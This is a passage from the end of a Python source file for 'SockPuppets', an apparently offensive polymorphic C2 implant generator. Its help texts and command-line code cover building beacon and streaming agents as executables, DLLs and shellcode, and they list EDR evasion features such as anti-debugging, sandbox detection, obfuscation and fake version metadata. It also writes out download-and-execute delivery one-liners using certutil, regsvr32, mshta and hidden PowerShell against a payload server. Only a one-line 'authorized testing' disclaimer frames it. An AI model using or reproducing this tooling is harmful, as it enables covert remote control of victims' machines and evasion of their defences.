                            continue  # Shellcode only supports x86/x64

                        sc_key = f'shellcode_{shellcode_format}_{arch}_{os_suffix}' if generate_multi_os else f'shellcode_{shellcode_format}_{arch}'
                        results[sc_key] = self.generate_shellcode(agent_path, arch=arch, format=shellcode_format)
                        if not results[sc_key].startswith('Error'):
                            print(f"[+] {arch.upper()} shellcode ({shellcode_format}) generated: {results[sc_key]}")
                        else:
                            print(f"[-] Shellcode generation failed: {results[sc_key]}")

        return results


def show_help_generate():
    """Show help for agent generation"""
    help_text = """
═══════════════════════════════════════════════════════════════════════════
                        AGENT GENERATION HELP
═══════════════════════════════════════════════════════════════════════════

BASIC USAGE:
    python agent.py --host <IP> --port <PORT> [OPTIONS]

REQUIRED PARAMETERS:
    --host <IP>         C2 server IP address or hostname
    --port <PORT>       C2 server port number

AGENT MODES:
    --beacon            Enable beacon mode (callbacks at intervals)
    --interval <SEC>    Beacon callback interval in seconds (default: 60)
    --jitter <PCT>      Beacon timing jitter 0-100% (default: 0)
                        Example: --jitter 30 = ±30% random variance

OPERATING SYSTEMS:
    --os <TYPE>         Target OS: auto, windows, linux, macos (default: auto)
    --multi-os          Generate agents for ALL operating systems

EXAMPLES:
    # Windows beacon agent with 30% jitter
    python agent.py --host 192.168.1.100 --port 443 --os windows --beacon --interval 60 --jitter 30

    # Linux streaming agent
    python agent.py --host 10.0.0.50 --port 8443 --os linux

    # Generate for all OS types
    python agent.py --host 192.168.1.100 --port 443 --multi-os --beacon --interval 120

For more help: python agent.py help [agents|formats|evasion|oneliners|examples]
"""
    print(help_text)

def show_help_agents():
    """Show help for agent types and features"""
    help_text = """
═══════════════════════════════════════════════════════════════════════════
                           AGENT TYPES HELP
═══════════════════════════════════════════════════════════════════════════

AGENT MODES:

    STREAMING MODE (Default)
    ├─ Persistent connection to C2
    ├─ Real-time command execution
    ├─ Heartbeat every 10 seconds
    └─ Best for: Interactive sessions

    BEACON MODE (--beacon)
    ├─ Periodic callbacks to C2
    ├─ Configurable sleep intervals
    ├─ Optional jitter for randomization
    ├─ Offline command queueing
    └─ Best for: Stealth, long-term access

OS-SPECIFIC FEATURES:

    WINDOWS AGENTS:
    ├─ Console window hiding (ctypes)
    ├─ Error dialog suppression
    ├─ PowerShell command execution
    ├─ Windows API integration
    └─ DLL injection support

    LINUX AGENTS:
    ├─ Daemonization (fork/setsid)
    ├─ /dev/null I/O redirection
    ├─ Shell detection ($SHELL)
    ├─ UID/GID reporting
    └─ Background process support

    MACOS AGENTS:
    ├─ Background process setup
    ├─ AppleScript execution support
    ├─ Unix daemonization
    ├─ Shell integration
    └─ Native macOS features

POLYMORPHIC FEATURES:
    ✓ Unique variable names per agent
    ✓ Unique function names per agent
    ✓ Unique encryption keys (SHA256-based)
    ✓ Randomized code structure
    ✓ Different binary signatures

EXAMPLES:
    # Windows agent with all features
    python agent.py --host 192.168.1.100 --port 443 --os windows --beacon --interval 30 --jitter 25

    # Linux daemon agent
    python agent.py --host 192.168.1.100 --port 443 --os linux --beacon --interval 300

    # macOS streaming agent
    python agent.py --host 192.168.1.100 --port 443 --os macos
"""
    print(help_text)

def show_help_formats():
    """Show help for output formats"""
    help_text = """
═══════════════════════════════════════════════════════════════════════════
                         OUTPUT FORMATS HELP
═══════════════════════════════════════════════════════════════════════════

COMPILATION OPTIONS:

    EXECUTABLES (--compile)
    ├─ Platform: Windows, Linux, macOS
    ├─ Architectures: x86, x64, arm64
    ├─ Features: UPX compression, fake version info
    ├─ Output: Standalone .exe or binary
    └─ Usage: python agent.py --host IP --port PORT --compile --arch x64

    DLLs (--dll)
    ├─ Platform: Windows only
    ├─ Architectures: x86, x64
    ├─ Features: DllMain export, thread-based execution
    ├─ Output: .dll file with random export name
    ├─ Usage: rundll32.exe <dll>,<export>
    └─ Example: python agent.py --host IP --port PORT --os windows --dll

    SHELLCODE (--shellcode)
    ├─ Platform: Windows (x86/x64)
    ├─ Formats:
    │   ├─ raw       → Binary .bin file
    │   ├─ c         → C array unsigned char[]
    │   ├─ python    → Python bytearray[]
    │   └─ powershell→ PowerShell byte array
    ├─ Features: Compressed, position-independent stub
    └─ Example: python agent.py --host IP --port PORT --shellcode --format c

ARCHITECTURE OPTIONS:
    --arch x86          32-bit Intel/AMD
    --arch x64          64-bit Intel/AMD (default)
    --arch arm64        64-bit ARM (compilation only)
    --arch x86 x64      Multi-architecture (space separated)

ADDITIONAL OPTIONS:
    --no-upx            Disable UPX compression
    --icon <file.ico>   Custom icon for executables
    --output <dir>      Output directory (default: output/)

EXAMPLES:

    # Compile Windows x64 executable
    python agent.py --host 192.168.1.100 --port 443 --os windows --compile

    # Multi-architecture compilation
    python agent.py --host 192.168.1.100 --port 443 --os windows --compile --arch x86 x64

    # DLL for injection
    python agent.py --host 192.168.1.100 --port 443 --os windows --dll --arch x64

    # Shellcode in C format
    python agent.py --host 192.168.1.100 --port 443 --os windows --shellcode --format c

    # Shellcode in PowerShell format
    python agent.py --host 192.168.1.100 --port 443 --os windows --shellcode --format powershell

    # All formats at once
    python agent.py --host 192.168.1.100 --port 443 --os windows --compile --dll --shellcode
"""
    print(help_text)

def show_help_evasion():
    """Show help for EDR evasion techniques"""
    help_text = """
═══════════════════════════════════════════════════════════════════════════
                        EDR EVASION TECHNIQUES
═══════════════════════════════════════════════════════════════════════════

POLYMORPHIC OBFUSCATION (Automatic):
    ✓ Variable name randomization      → obj_ABC123, ctx_XYZ789
    ✓ Function name randomization      → handler_DEF456, proc_GHI012
    ✓ Import alias randomization       → import time as mgr_JKL345
    ✓ Unique code structure per agent  → Different instruction ordering
    ✓ Dead code insertion              → Benign junk functions/variables

STRING OBFUSCATION (Automatic):
    ✓ Base64 encoding                  → __import__('base64').b64decode(...)
    ✓ Hexadecimal encoding             → bytes.fromhex('...')
    ✓ Reverse string encoding          → 'string'[::-1]
    ✓ XOR encoding with random key     → chr(ord(c)^KEY)

ANTI-ANALYSIS (Automatic):
    ✓ Anti-debugging checks            → sys.gettrace() detection
    ✓ Sandbox timing detection         → VM detection via timing
    ✓ Entropy reduction (EK47)         → Shannon entropy < 7.0
    ✓ Comment stripping                → No OPSEC-sensitive comments
    ✓ Docstring removal                → No documentation strings

BINARY OBFUSCATION (--compile):
    ✓ Fake version information         → Mimics Microsoft/Adobe/etc
    ✓ Randomized executable names      → Unique filenames
    ✓ UPX compression (optional)       → Adds entropy, signature variation
    ✓ Debug symbol stripping           → Removes debugging info
    ✓ Unique binary signatures         → Different hash per compilation

ENCRYPTION:
    ✓ Unique XOR keys per agent        → SHA256-based key generation
    ✓ Randomized key length            → Varies per agent
    ✓ No hardcoded keys                → Generated at creation time

ENTROPY MANAGEMENT (EK47 Technique):
    Target: Shannon entropy < 7.0 (normal code range: 4.5-6.5)
    Method: Low-entropy padding with common English words
    Result: Appears as legitimate code to entropy-based scanners

OPSEC FEATURES:
    ✓ No comments in generated code    → Clean, production-ready
    ✓ No debug output                  → Silent execution
    ✓ No hardcoded identifiers         → Fully randomized
    ✓ Minimal static signatures        → Hard to signature

EVASION STATUS:
    [AUTO] Polymorphism                Enabled by default
    [AUTO] String obfuscation          Enabled by default
    [AUTO] Anti-debugging              Enabled by default
    [AUTO] Sandbox detection           Enabled by default
    [AUTO] Entropy reduction           Enabled by default
    [AUTO] Comment stripping           Enabled by default
    [OPT]  UPX compression             --compile (enabled unless --no-upx)
    [OPT]  Fake metadata               --compile (Windows only)

NOTE: All evasion techniques are applied automatically. No additional flags needed.

EXAMPLES:
    # Generate with all evasion (default)
    python agent.py --host 192.168.1.100 --port 443 --os windows

    # Compile with fake version info
    python agent.py --host 192.168.1.100 --port 443 --os windows --compile

    # Disable UPX if needed
    python agent.py --host 192.168.1.100 --port 443 --os windows --compile --no-upx
"""
    print(help_text)

def show_help_oneliners():
    """Show help for one-liner payloads"""
    help_text = """
═══════════════════════════════════════════════════════════════════════════
                        ONE-LINER PAYLOADS HELP
═══════════════════════════════════════════════════════════════════════════

USAGE:
    python agent.py --host <IP> --port <PORT> --oneliners <PAYLOAD_URL>

DESCRIPTION:
    Generates one-liner payloads for various delivery mechanisms.
    Output saved to: output/oneliners.txt

DELIVERY MECHANISMS (15+):

    POWERSHELL:
    ├─ powershell                → Basic download & execute
    └─ powershell_amsi_bypass    → With AMSI bypass

    WINDOWS NATIVE:
    ├─ mshta                     → JavaScript execution
    ├─ mshta_download            → VBScript download wrapper
    ├─ wscript                   → VBScript execution
    ├─ rundll32                  → JavaScript via RunHTMLApplication
    ├─ certutil                  → Download via CertUtil
    ├─ bitsadmin                 → Background Intelligent Transfer
    ├─ regsvr32                  → Squiblydoo technique
    ├─ msiexec                   → MSI installer execution
    └─ curl                      → Windows 10+ curl

    LINUX/UNIX:
    ├─ wget_linux                → Download via wget
    ├─ curl_linux                → Download via curl
    └─ python                    → Python one-liner

    NETWORK:
    └─ smb                       → UNC path execution

EXAMPLE USAGE:

    # Generate one-liners for hosted payload
    python agent.py --host 192.168.1.100 --port 443 --os windows \\
        --oneliners http://192.168.1.100:8000/agent.exe

    # This creates output/oneliners.txt with all delivery methods

EXAMPLE OUTPUT (oneliners.txt):

    ## powershell
    powershell -w hidden -enc <BASE64_ENCODED_COMMAND>

    ## mshta
    mshta.exe javascript:a=GetObject("script:http://...").Exec();close()

    ## certutil
    certutil -urlcache -split -f http://server/agent.exe %temp%\\p.exe && %temp%\\p.exe

    ## regsvr32 (Squiblydoo)
    regsvr32 /s /n /u /i:http://server/agent.exe scrobj.dll

    ... and 11 more variants

DELIVERY TIPS:
    • PowerShell: Best for quick execution, consider AMSI
    • MSHTA: Good for bypassing AppLocker
    • Rundll32: Living-off-the-land binary
    • CertUtil: Commonly whitelisted
    • Regsvr32: Squiblydoo - COM scriptlet execution
    • SMB: Direct execution from network share

COMPLETE WORKFLOW:
    1. Generate agent:
       python agent.py --host 192.168.1.100 --port 443 --os windows --compile

    2. Host payload:
       python -m http.server 8000  # In output/ directory

    3. Generate one-liners:
       python agent.py --host 192.168.1.100 --port 443 --os windows \\
           --oneliners http://192.168.1.100:8000/agent_ABC123_x64.exe

    4. Use payload:
       powershell -w hidden -enc <BASE64_FROM_ONELINERS_TXT>
"""
    print(help_text)

def show_help_examples():
    """Show comprehensive examples"""
    help_text = """
═══════════════════════════════════════════════════════════════════════════
                         COMPREHENSIVE EXAMPLES
═══════════════════════════════════════════════════════════════════════════

BASIC AGENT GENERATION:

    # Simple Windows streaming agent
    python agent.py --host 192.168.1.100 --port 443 --os windows

    # Linux beacon agent (2-minute callback)
    python agent.py --host 192.168.1.100 --port 443 --os linux --beacon --interval 120

    # macOS beacon with 50% jitter
    python agent.py --host 192.168.1.100 --port 443 --os macos --beacon --interval 60 --jitter 50

MULTI-OS DEPLOYMENT:

    # Generate agents for all platforms
    python agent.py --host 192.168.1.100 --port 443 --multi-os --beacon --interval 180

    # Compile for all platforms
    python agent.py --host 192.168.1.100 --port 443 --multi-os --compile

COMPILATION SCENARIOS:

    # Windows x64 executable
    python agent.py --host 192.168.1.100 --port 443 --os windows --compile

    # Windows x86 + x64 executables
    python agent.py --host 192.168.1.100 --port 443 --os windows --compile --arch x86 x64

    # Windows executable with custom icon
    python agent.py --host 192.168.1.100 --port 443 --os windows --compile --icon app.ico

    # Disable UPX compression
    python agent.py --host 192.168.1.100 --port 443 --os windows --compile --no-upx

DLL INJECTION:

    # Generate x64 DLL
    python agent.py --host 192.168.1.100 --port 443 --os windows --dll --arch x64

    # Generate x86 DLL
    python agent.py --host 192.168.1.100 --port 443 --os windows --dll --arch x86

    # Both architectures
    python agent.py --host 192.168.1.100 --port 443 --os windows --dll --arch x86 x64

    # Execute DLL:
    rundll32.exe <dll_name>,<export_function>

SHELLCODE GENERATION:

    # Raw binary shellcode
    python agent.py --host 192.168.1.100 --port 443 --os windows --shellcode

    # C array format (for C/C++ projects)
    python agent.py --host 192.168.1.100 --port 443 --os windows --shellcode --format c

    # Python format (for Python injectors)
    python agent.py --host 192.168.1.100 --port 443 --os windows --shellcode --format python

    # PowerShell format (for PS injectors)
    python agent.py --host 192.168.1.100 --port 443 --os windows --shellcode --format powershell

ONE-LINER GENERATION:

    # Generate delivery payloads
    python agent.py --host 192.168.1.100 --port 443 --os windows \\
        --oneliners http://192.168.1.100:8000/agent.exe

COMPLETE WORKFLOWS:

    # Red Team Assessment - Full suite
    python agent.py --host 10.0.0.50 --port 443 --os windows \\
        --beacon --interval 300 --jitter 30 \\
        --compile --dll --shellcode --format c \\
        --arch x86 x64 \\
        --oneliners http://10.0.0.50:8000/agent.exe

    # Stealth Operation - Long beacon
    python agent.py --host 192.168.1.100 --port 443 --os windows \\
        --beacon --interval 3600 --jitter 50 \\
        --compile --no-upx

    # Quick Access - Streaming mode
    python agent.py --host 192.168.1.100 --port 8443 --os linux

    # Multi-platform deployment
    python agent.py --host 192.168.1.100 --port 443 \\
        --multi-os --beacon --interval 600 --jitter 25 \\
        --compile --arch x64

OUTPUT STRUCTURE:

    output/
    ├── agent_<hash>_beacon<interval>s_<os>.py    # Python source
    ├── <random>_x64.exe                           # Executable
    ├── <random>_x64.dll                           # DLL
    ├── shellcode_<random>_x64.bin                 # Raw shellcode
    ├── shellcode_<random>_x64.c                   # C array
    ├── shellcode_<random>_x64.py                  # Python array
    ├── shellcode_<random>_x64.ps1                 # PowerShell array
    ├── oneliners.txt                              # One-liner payloads
    └── agent_*.ps1/js/hta                         # Other formats

TIPS:
    • Always use unique agents per target (automatic)
    • Use beacon mode with jitter for stealth
    • Multi-architecture compilation for compatibility
    • One-liners provide multiple delivery options
    • Combine --compile --dll --shellcode for full arsenal
"""
    print(help_text)

def show_main_help():
    """Show main help menu"""
    help_text = """
═══════════════════════════════════════════════════════════════════════════
              SockPuppets - Polymorphic Agent Generator v2.0
                        EDR Evasion & Multi-Platform C2
═══════════════════════════════════════════════════════════════════════════

USAGE:
    python agent.py --host <IP> --port <PORT> [OPTIONS]
    python agent.py help [topic]

HELP TOPICS:
    help generate     → Agent generation options and modes
    help agents       → Agent types, features, and OS-specific details
    help formats      → Output formats (EXE, DLL, shellcode)
    help evasion      → EDR evasion techniques and features
    help oneliners    → One-liner payload generation
    help examples     → Comprehensive usage examples

QUICK START:
    # Generate Windows beacon agent
    python agent.py --host 192.168.1.100 --port 443 --os windows --beacon --interval 60

    # Generate for all OS types
    python agent.py --host 192.168.1.100 --port 443 --multi-os

    # Compile to executable with DLL
    python agent.py --host 192.168.1.100 --port 443 --os windows --compile --dll

KEY FEATURES:
    ✓ Polymorphic code generation      → Unique signature per agent
    ✓ Advanced EDR evasion             → Anti-debug, sandbox detection
    ✓ Multi-OS support                 → Windows, Linux, macOS
    ✓ Multiple output formats          → EXE, DLL, shellcode
    ✓ 15+ delivery mechanisms          → One-liner generation
    ✓ Entropy reduction (EK47)         → Shannon entropy < 7.0
    ✓ OPSEC-safe                       → No comments, clean code
    ✓ Unique encryption per agent      → Auto-generated keys

COMMON OPTIONS:
    --host <IP>          C2 server address (required)
    --port <PORT>        C2 server port (required)
    --os <TYPE>          Target OS: windows, linux, macos, auto
    --beacon             Enable beacon mode
    --interval <SEC>     Beacon callback interval (default: 60)
    --jitter <PCT>       Beacon timing jitter 0-100% (default: 0)
    --compile            Compile to executable
    --dll                Compile to DLL (Windows)
    --shellcode          Generate shellcode
    --oneliners <URL>    Generate one-liner payloads

For detailed help on any topic:
    python agent.py help <topic>

For authorized security testing only.
"""
    print(help_text)

if __name__ == '__main__':
    import argparse
    import sys

    # Check if help command was requested
    if len(sys.argv) > 1 and sys.argv[1] == 'help':
        if len(sys.argv) > 2:
            topic = sys.argv[2].lower()
            if topic == 'generate':
                show_help_generate()
            elif topic == 'agents':
                show_help_agents()
            elif topic == 'formats':
                show_help_formats()
            elif topic == 'evasion':
                show_help_evasion()
            elif topic == 'oneliners':
                show_help_oneliners()
            elif topic == 'examples':
                show_help_examples()
            else:
                print(f"Unknown help topic: {topic}")
                print("Available topics: generate, agents, formats, evasion, oneliners, examples")
        else:
            show_main_help()
        sys.exit(0)

    parser = argparse.ArgumentParser(
        description='SockPuppets - Polymorphic Agent Generator with EDR Evasion',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='For detailed help: python agent.py help [generate|agents|formats|evasion|oneliners|examples]'
    )
    parser.add_argument('--host', required=True, help='Server host/IP')
    parser.add_argument('--port', type=int, required=True, help='Server port')
    parser.add_argument('--key', default='SOCKPUPPETS_KEY_2026', help='Encryption key (auto-generated by default)')
    parser.add_argument('--beacon', action='store_true', help='Enable beacon mode')
    parser.add_argument('--interval', type=int, default=60, help='Beacon interval in seconds (default: 60)')
    parser.add_argument('--jitter', type=int, default=0, help='Beacon jitter percentage 0-100 (default: 0)')
    parser.add_argument('--compile', action='store_true', help='Compile Python agent to executable')
    parser.add_argument('--dll', action='store_true', help='Compile Python agent to DLL (Windows only)')
    parser.add_argument('--shellcode', action='store_true', help='Generate shellcode from agent')
    parser.add_argument('--format', choices=['raw', 'c', 'python', 'powershell'], default='raw',
                       help='Shellcode output format (default: raw)')
    parser.add_argument('--arch', nargs='+', choices=['x86', 'x64', 'arm64'], default=['x64'],
                       help='Target architecture(s) for compilation (default: x64)')
    parser.add_argument('--no-upx', action='store_true', help='Disable UPX compression')
    parser.add_argument('--icon', type=str, help='Path to icon file (.ico) for executable')
    parser.add_argument('--output', default='output', help='Output directory (default: output)')
    parser.add_argument('--os', dest='target_os', choices=['auto', 'windows', 'linux', 'macos'], default='auto',
                       help='Target operating system (default: auto = current platform)')
    parser.add_argument('--multi-os', dest='multi_os', action='store_true',
                       help='Generate agents for all operating systems (Windows, Linux, macOS)')
    parser.add_argument('--bin', action='store_true',
                       help='Generate raw .bin payloads for packer consumption')
    parser.add_argument('--raw-shellcode', dest='raw_shellcode', action='store_true',
                       help='Generate self-decoding shellcode blobs')
    parser.add_argument('--oneliners', type=str, metavar='URL',
                       help='Generate one-liner payloads for delivery (provide payload URL)')
    parser.add_argument('--transport', choices=['websocket', 'http', 'https'], default='websocket',
                       help='Transport protocol (default: websocket)')

    args = parser.parse_args()

    print("[*] Polymorphic Agent Generator with EDR Evasion")
    print("[*] Each generated agent has unique code signatures")
    print()

    generator = AgentGenerator(args.output)
    results = generator.generate_all(
        c2_host=args.host, c2_port=args.port, encryption_key=args.key,
        beacon_mode=args.beacon, beacon_interval=args.interval, beacon_jitter=args.jitter,
        compile_exe=args.compile, compile_dll=args.dll, generate_shellcode=args.shellcode,
        shellcode_format=args.format, architectures=args.arch, upx=not args.no_upx,
        icon=args.icon, target_os=args.target_os, generate_multi_os=args.multi_os,
        generate_bin=args.bin, raw_shellcode=args.raw_shellcode,
        transport=args.transport
    )

    print("\n" + "="*60)
    print("[+] Agent generation complete!")
    print("="*60)
    print(f"[+] Output directory: {args.output}")
    if args.beacon:
        jitter_info = f" with {args.jitter}% jitter" if args.jitter > 0 else ""
        print(f"[+] Beacon mode enabled with {args.interval}s interval{jitter_info}")
    if args.multi_os:
        print(f"[+] Generated agents for: Windows, Linux, macOS")
    elif args.target_os != 'auto':
        print(f"[+] Generated agents for: {args.target_os}")
    if args.compile:
        print(f"[+] Compiled for architectures: {', '.join(args.arch)}")
    print("\n[*] Features enabled:")
    print("    - Polymorphic code generation (unique per agent)")
    print("    - Anti-debugging checks")
    print("    - Sandbox detection")
    print("    - String obfuscation")
    print("    - Unique encryption keys")
    print("    - OS-specific optimizations")

    # Generate one-liners if requested
    if hasattr(args, 'oneliners') and args.oneliners:
        print("\n[*] Generating one-liner payloads...")
        oneliners = generator.generate_oneliners(args.oneliners, 'oneliners.txt')
        print(f"[+] Generated {len(oneliners)} one-liner variants")
        print("\n[*] One-liner delivery mechanisms:")
        for name in oneliners.keys():
            print(f"    - {name}")
